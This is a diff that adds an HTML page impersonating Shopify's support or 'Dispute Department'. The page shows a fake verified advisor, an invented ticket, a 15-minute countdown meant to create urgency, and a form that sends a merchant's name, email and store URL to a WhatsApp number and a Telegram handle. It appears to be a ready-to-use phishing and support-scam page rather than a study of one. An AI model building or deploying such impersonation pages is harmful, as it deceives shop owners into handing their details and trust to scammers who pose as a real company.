@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shopify Seller Permit</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer"/>
+    <style>
+        @keyframes beep {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .animate-beep {
+            animation: beep 1s infinite;
+        }
+        :root{
+            --green:#008060; 
+            --teal:#004c3f; 
+            --muted:#6b7280; 
+            --border:#e6e7ea; 
+            --bg:#f8fafb;
+        }
+        body{background:var(--bg);color:#0f172a}
+        .focus-ring:focus{outline:none;box-shadow:0 0 0 4px rgba(0,128,96,.12)}
+        .step-dot{width:36px;height:36px;border-radius:9999px;display:inline-flex;align-items:center;justify-content:center;border:1px solid var(--border);background:#fff}
+        .step-dot.active{background:var(--green);color:white;border-color:var(--green)}
+        .step-line{height:2px;background:var(--border);flex:1}
+        .step-line.active{background:var(--green)}
+        .card{background:white;border:1px solid var(--border);border-radius:12px}
+        .animate-fade-in { animation: fadeIn .18s ease-out; }
+        @keyframes fadeIn { from{opacity:0; transform:translateY(8px);} to{opacity:1; transform:translateY(0);} }
+        .hidden { display: none !important; }
+
+        /* Mobile tweaks */
+        @media(max-width:640px){
+            .card { padding: 1rem !important; }
+            #dashboard { padding: 1rem !important; }
+            .grid { gap: 1rem !important; }
+            .steps-scroll { overflow-x:auto; -webkit-overflow-scrolling: touch; scroll-behavior: smooth; }
+            .steps-scroll::-webkit-scrollbar { display:none; }
+        }
+        .ticker-wrapper {
+            overflow:hidden;
+            white-space:nowrap;
+            background: #e6f7f1;
+            border-radius: 12px;
+            padding:0.5rem 0;
+        }
+        .ticker {
+            display:inline-block;
+            padding-left:100%;
+            animation: ticker 20s linear infinite;
+            font-weight:600;
+            color:#008060;
+        }
+        @keyframes ticker {
+            0% { transform: translateX(0%); }
+            100% { transform: translateX(-100%); }
+        }
+    </style>
+</head>
+<body class="font-sans antialiased">
+
+<!-- Loading -->
+<section id="loading" class="min-h-screen flex items-center justify-center">
+    <div class="max-w-xl w-full p-6 text-center">
+        <img src="https://cdn.shopify.com/assets/images/logos/shopify-bag.png" class="mx-auto h-14 mb-4" alt="Shopify"/>
+        <h1 class="text-2xl font-semibold">Connecting you with a Specialist</h1>
+        <p class="text-sm text-[var(--muted)] mt-2">Preparing your secure session — this takes a moment.</p>
+        <div class="relative mx-auto mt-8 w-28 h-28">
+            <div class="w-28 h-28 rounded-full border-4 border-gray-200"></div>
+            <div class="absolute inset-0 rounded-full border-4 border-[var(--green)] border-t-transparent animate-spin"></div>
+            <div id="pct" class="absolute inset-0 flex items-center justify-center font-medium text-gray-700">0%</div>
+        </div>
+    </div>
+</section>
+
+<!-- Dashboard -->
+<main id="dashboard" class="hidden max-w-6xl mx-auto py-10 px-6 space-y-8">
+    <header class="flex items-center justify-between mb-8">
+        <div class="flex items-center gap-4">
+            <img src="https://cdn.shopify.com/assets/images/logos/shopify-bag.png" alt="Shopify" class="h-9"/>
+            <div>
+                <div class="text-lg font-semibold">Shopify Dispute Department</div>
+                <div class="text-sm text-[var(--muted)]">Helping Merchants Grow Safely & Profitably</div>
+            </div>
+        </div>
+        <div class="text-sm inline-flex items-center gap-2 px-3 py-1 rounded-full bg-green-50 text-blue-700"> 
+            <i class="fa-solid fa-circle text-[8px] text-green-500"></i> Online
+        </div>
+        <div id="countdown" class="text-2xl font-bold text-green-600"></div>
+    </header>
+
+    <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
+        <!-- Left Column -->
+        <aside class="card p-6 space-y-6">
+          
+            <div class="flex items-center gap-4">
+                <div class="w-16 h-16 rounded-full bg-gradient-to-br from-[var(--teal)] to-[var(--green)] text-white flex items-center justify-center text-xl font-semibold">JD</div>
+                <div>
+                    <div class="flex items-center gap-1">
+                        <div class="text-lg font-semibold">JASON DEV</div>
+                        <i class="fa-solid fa-circle-check text-blue-500 text-sm"></i>
+                    </div>
+                    <div class="text-sm text-[var(--muted)]">Shopify Support Adivsor & Partner</div>
+                </div>
+            </div>
+            <p class="text-sm text-[var(--muted)] mt-4">We help you analyse and resolve compliance issues and grow your Shopify store through strategic marketing, SEO, and performance optimization. </p>
+
+            <div class="grid gap-3">
+                <button id="waOpenBtn" class="w-full inline-flex items-center justify-center gap-3 bg-green-500 text-white py-2.5 rounded-md focus-ring">
+                    <i class="fa-brands fa-whatsapp"></i><span>Contact via WhatsApp</span>
+                </button>
+                <button onclick="openForm('telegram')" class="w-full inline-flex items-center justify-center gap-3 bg-[#0088cc] text-white py-2.5 rounded-md focus-ring">
+                    <i class="fa-brands fa-telegram"></i><span>Contact via Telegram</span>
+                </button>
+            </div>
+
+            <div class="space-y-3">
+                <h4 class="text-sm font-medium text-gray-700">Advisor stats</h4>
+                <div class="text-sm text-[var(--muted)] space-y-1">
+                    <div class="flex items-center gap-1">
+                        <i class="fa-solid fa-certificate text-[var(--green)]"></i>
+                        <span>Professional</span>
+                    </div>
+                    <div class="flex items-center gap-1">
+                        <i class="fa-solid fa-clock text-[var(--green)]"></i>
+                        <span>5+ years experience</span>
+                    </div>
+                    <div class="flex items-center gap-1">
+                        <i class="fa-solid fa-store text-[var(--green)]"></i>
+                        <span>50+ stores helped</span>
+                    </div>
+                    <div class="flex items-center gap-1">
+                        <i class="fa-solid fa-star text-yellow-400"></i>
+                        <span>Rating 4.9/5</span>
+                        <div class="inline-flex ml-1 text-yellow-400">
+                            <i class="fa-solid fa-star"></i>
+                            <i class="fa-solid fa-star"></i>
+                            <i class="fa-solid fa-star"></i>
+                            <i class="fa-solid fa-star"></i>
+                            <i class="fa-regular fa-star"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </aside>
+
+        <!-- Right Column -->
+        <section class="lg:col-span-2 space-y-6">
+            <!-- Services Section -->
+            <div class="card p-6 space-y-4">
+                <h3 class="font-semibold text-lg mb-2">Services & Benefits</h3>
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div class="flex items-start gap-3">
+                        <i class="fa-solid fa-shield-halved text-[var(--green)] text-2xl mt-1"></i>
+                        <div>
+                            <div class="font-medium">Compliance & Security</div>
+                            <div class="text-sm text-[var(--muted)]">Protect your store and payments with expert guidance.</div>
+                        </div>
+                    </div>
+                    <div class="flex items-start gap-3">
+                        <i class="fa-solid fa-bullhorn text-[var(--green)] text-2xl mt-1"></i>
+                        <div>
+                            <div class="font-medium">Marketing & Sales Growth</div>
+                            <div class="text-sm text-[var(--muted)]">Boost your revenue with tailored campaigns and strategies.</div>
+                        </div>
+                    </div>
+                    <div class="flex items-start gap-3">
+                        <i class="fa-solid fa-chart-line text-[var(--green)] text-2xl mt-1"></i>
+                        <div>
+                            <div class="font-medium">SEO & Store Visibility</div>
+                            <div class="text-sm text-[var(--muted)]">Improve search ranking and attract more customers.</div>
+                        </div>
+                    </div>
+                    <div class="flex items-start gap-3">
+                        <i class="fa-solid fa-gear text-[var(--green)] text-2xl mt-1"></i>
+                        <div>
+                            <div class="font-medium">Shopify Best Practices</div>
+                            <div class="text-sm text-[var(--muted)]">Optimize your store operations and performance for success.</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Ticket Section -->
+            <div class="card p-6 space-y-4">
+                <div class="flex items-start justify-between">
+                    <div>
+                        <div class="text-sm text-[var(--muted)]">Ticket</div>
+                        <div class="text-xl font-semibold">#J9N-O20</div>
+                    </div>
+                    <div class="text-sm text-[var(--muted)]">
+                        <div>Partner ID: <span class="font-medium">4456337</span></div>
+                        <div class="mt-1 flex items-center gap-1">Status: <span class="text-green-700 font-medium">Active</span> <span id="statusBeep" class="w-2 h-2 bg-green-500 rounded-full animate-beep"></span></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Case Progress Section (start) -->
+            <div class="card p-6 space-y-4">
+                <div class="flex items-center justify-between mb-3">
+                    <h3 class="font-semibold">Case Progress</h3>
+                    <div id="progressLabel" class="text-sm text-[var(--muted)]">Step 2 of 4</div>
+                </div>
+
+                <div class="steps-scroll flex items-center gap-2">
+                    <div class="flex items-center gap-2 min-w-[120px]">
+                        <div class="step-dot active">1</div>
+                        <div class="text-sm ml-2 whitespace-nowrap">Case Created</div>
+                    </div>
+                    <div class="step-line flex-1 bg-gray-300"></div>
+                    <div class="flex items-center gap-2 min-w-[120px]">
+                        <div class="step-dot active">2</div>
+                        <div class="text-sm ml-2 whitespace-nowrap">Advisor Assigned</div>
+                    </div>
+                    <div class="step-line flex-1 bg-gray-300"></div>
+                    <div class="flex items-center gap-2 min-w-[120px]">
+                        <div class="step-dot">3</div>
+                        <div class="text-sm ml-2 whitespace-nowrap">Pending Review</div>
+                    </div>
+                    <div class="step-line flex-1 bg-gray-300"></div>
+                    <div class="flex items-center gap-2 min-w-[120px]">
+                        <div class="step-dot">4</div>
+                        <div class="text-sm ml-2 whitespace-nowrap">Active</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Sliding Ticker Text -->
+            <div class="ticker-wrapper">
+                <div class="ticker">
+                     Boost your Shopify store performance! •  ⚡ Resolve compliance issues instantly! •  📈 Increase your SEO visibility and sales! •  💡 Expert marketing guidance!
+                </div>
+            </div>
+        </section>
+    </div>
+</main>
+
+<!-- Modal Contact Form -->
+<div id="modal" class="fixed inset-0 hidden items-center justify-center z-50 px-4">
+    <div class="bg-white w-full max-w-2xl rounded-lg p-6 card animate-fade-in">
+        <div class="flex items-start justify-between">
+            <div>
+                <h3 class="text-lg font-semibold">Contact Advisor</h3>
+                <div class="text-sm text-[var(--muted)]">Ticket <span id="ticketRef" class="font-medium">#J9N-O20</span></div>
+            </div>
+            <button aria-label="Close" id="modalCloseBtn" class="text-gray-500 hover:text-gray-800"><i class="fa-solid fa-xmark"></i></button>
+        </div>
+        <form id="contactForm" class="mt-4 space-y-4" onsubmit="handleSubmit(event)">
+            <input type="hidden" id="methodField" />
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                    <label class="block text-sm text-gray-700">Ticket ID</label>
+                    <input id="ticketInput" type="text" value="#J9N-O20" readonly class="w-full border border-[var(--border)] rounded-md px-3 py-2 bg-gray-50 text-sm" />
+                </div>
+                <div>
+                    <label class="block text-sm text-gray-700">Store URL</label>
+                    <input id="storeInput" type="text" class="w-full border border-[var(--border)] rounded-md px-3 py-2 focus-ring text-sm" placeholder="yourstore.myshopify.com" />
+                </div>
+                <div>
+                    <label class="block text-sm text-gray-700">Email address</label>
+                    <input id="emailInput" type="text" required class="w-full border border-[var(--border)] rounded-md px-3 py-2 focus-ring text-sm" placeholder="you@example.com" />
+                </div>
+                <div>
+                    <label class="block text-sm text-gray-700">Issue type</label>
+                    <select id="issueInput" required class="w-full border border-[var(--border)] rounded-md px-3 py-2 focus-ring text-sm">
+                        <option value="">Select an issue</option>
+                        <option>Compliance Warning</option>
+                        <option>Checkout or Payment Issues</option>
+                        <option>Seller Permit</option>
+                        <option>Store Visibility / SEO</option>
+                        <option>Sales Performance</option>
+                        <option>Other</option>
+                    </select>
+                </div>
+            </div>
+            <div>
+                <label class="block text-sm text-gray-700">Your name</label>
+                <input id="nameInput" type="text" required class="w-full border border-[var(--border)] rounded-md px-3 py-2 focus-ring text-sm" />
+            </div>
+            <div>
+                <label class="block text-sm text-gray-700">Message</label>
+                <textarea id="messageInput" rows="4" required class="w-full border border-[var(--border)] rounded-md px-3 py-2 focus-ring text-sm" placeholder="Summary of the issue..."></textarea>
+            </div>
+            <div class="flex items-center justify-end gap-3">
+                <button type="button" id="cancelBtn" class="px-4 py-2 rounded-md border">Cancel</button>
+                <button id="submitBtn" type="submit" class="px-4 py-2 rounded-md bg-[var(--green)] text-white inline-flex items-center gap-2">
+                    <span class="label">Submit</span>
+                </button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<script>
+// Countdown timer (15 minutes)
+let countdownTime = 15 * 60; // 15 minutes in seconds
+let beepInterval;
+const countdownElement = document.getElementById('countdown');
+
+function updateCountdown() {
+    const minutes = Math.floor(countdownTime / 60);
+    const seconds = countdownTime % 60;
+    countdownElement.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+    
+    if (countdownTime <= 600) { // 10 minutes left
+        countdownElement.classList.remove('text-green-600');
+        countdownElement.classList.add('text-red-600', 'text-3xl');
+        
+        // Start beeping effect if not already started
+        if (!beepInterval) {
+            beepInterval = setInterval(() => {
+                const statusBeep = document.getElementById('statusBeep');
+                if (statusBeep) {
+                    statusBeep.classList.toggle('opacity-50');
+                }
+            }, 1000);
+        }
+    }
+
+    if (countdownTime <= 0) {
+        clearInterval(countdownInterval);
+        const statusBeep = document.getElementById('statusBeep');
+        if (statusBeep) {
+            statusBeep.classList.remove('animate-beep');
+        }
+        // Close the website after countdown
+        document.body.innerHTML = '<div class="min-h-screen flex items-center justify-center"><div class="text-center"><h1 class="text-2xl font-semibold mb-4">Session Expired</h1><p class="text-gray-600">This session has ended. Please refresh to start a new one.</p></div></div>';
+    } else {
+        countdownTime--;
+    }
+}
+
+const countdownInterval = setInterval(updateCountdown, 1000);
+
+// Loading animation
+const loading = document.getElementById('loading');
+const dashboard = document.getElementById('dashboard');
+const pct = document.getElementById('pct');
+let value = 0;
+const t = setInterval(()=>{
+    value = Math.min(100,value + Math.floor(Math.random()*7)+3);
+    pct.textContent = value + '%';
+    if(value>=100){
+        clearInterval(t);
+        loading.classList.add('hidden');
+        dashboard.classList.remove('hidden');
+        updateCountdown(); // Initialize countdown display
+    }
+},110);
+
+// Modal
+const modal = document.getElementById('modal');
+const contactForm = document.getElementById('contactForm');
+const methodField = document.getElementById('methodField');
+document.getElementById('waOpenBtn').addEventListener('click', ()=> openForm('whatsapp'));
+document.getElementById('cancelBtn').addEventListener('click', ()=> closeForm());
+document.getElementById('modalCloseBtn').addEventListener('click', ()=> closeForm());
+
+function openForm(method){
+    methodField.value = method;
+    modal.classList.remove('hidden');
+    modal.classList.add('flex');
+}
+function closeForm(){
+    modal.classList.add('hidden');
+    modal.classList.remove('flex');
+    contactForm.reset();
+}
+
+// Submission
+function handleSubmit(e){
+    e.preventDefault();
+    const method = methodField.value;
+    const ticket = document.getElementById('ticketInput').value;
+    const store = document.getElementById('storeInput').value;
+    const email = document.getElementById('emailInput').value;
+    const issue = document.getElementById('issueInput').value;
+    const name = document.getElementById('nameInput').value;
+    const message = document.getElementById('messageInput').value;
+    let url='';
+    const body = encodeURIComponent(
+        'Ticket: ' + ticket + '\n' +
+        'Name: ' + name + '\n' +
+        'Email: ' + email + '\n' +
+        'Store: ' + store + '\n' +
+        'Issue: ' + issue + '\n' +
+        'Message: ' + message
+    );
+    if(method==='whatsapp') url='https://wa.me/2349056841050=' + body;
+    else if(method==='telegram') url='https://t.me/merchant_support_advisor';
+    window.open(url,'_blank');
+}
+</script>
+
+</body>
+</html>
